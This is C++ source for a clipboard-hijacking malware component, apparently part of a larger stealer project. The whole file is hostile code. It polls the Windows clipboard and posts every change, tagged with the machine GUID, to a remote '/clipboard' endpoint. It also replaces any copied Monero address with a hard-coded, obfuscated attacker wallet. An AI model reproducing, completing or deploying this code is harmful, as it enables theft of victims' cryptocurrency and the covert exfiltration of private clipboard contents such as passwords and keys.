#include <kitty/clipboard.h>
#include <kitty/socket.h>
#include <adv/MetaString.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <kitty/system.h>
#include <kitty/log.h>

ClipboardEngine::ClipboardEngine()
{

}

void ClipboardEngine::Run(DWORD msInterval)
{
	for (;;)
	{
		if (!OpenClipboard(nullptr))
			return;

		FetchClipboardText();
		
		// if xmr address is copied, replace it with our own
		if (content.length() == 95 && (content.at(0) == '4' || content.at(0) == '8'))
			ReplaceXMR();

		CloseClipboard();

		Sleep(msInterval);
	}
}

void ClipboardEngine::FetchClipboardText()
{
	HANDLE hData{ GetClipboardData(CF_TEXT) };
	if (!hData)
	{
		content = "";
		return;
	}

	char* data = static_cast<char*>(GlobalLock(hData));
	if (!data)
		return;

	if (content != data)
	{
		content = data;
		SendClipboardContent();
	}

	GlobalUnlock(hData);
}

void ClipboardEngine::ReplaceXMR()
{
	const char* address{ OBFUSCATED("4ArM6rCdFKkgtkHbwQAxj5M3bgZopoT1xcdLtLpH1qi65DzsTBML19Sav59df5f5Av89VDSh6bSa13TxpF6zBG9JCrNLp8h") };

	if (!OpenClipboard(nullptr))
		KittyLog(OBFUSCATED("Failed to open clipboard"), false);

	HANDLE hMem{};
	hMem = GlobalAlloc(GMEM_FIXED, 95);

	if (!hMem)
		return;

	memcpy(hMem, address, 95);

	SetClipboardData(CF_TEXT, hMem);

	CloseClipboard();
}

bool ClipboardEngine::SendClipboardContent() const
{
	char guid[64];
	GetMachineGuid(guid);

	nlohmann::json map{};
	map[OBFUSCATED("guid")] = guid;
	map[OBFUSCATED("content")] = content;
	return SendPost(OBFUSCATED("/clipboard"), map);
}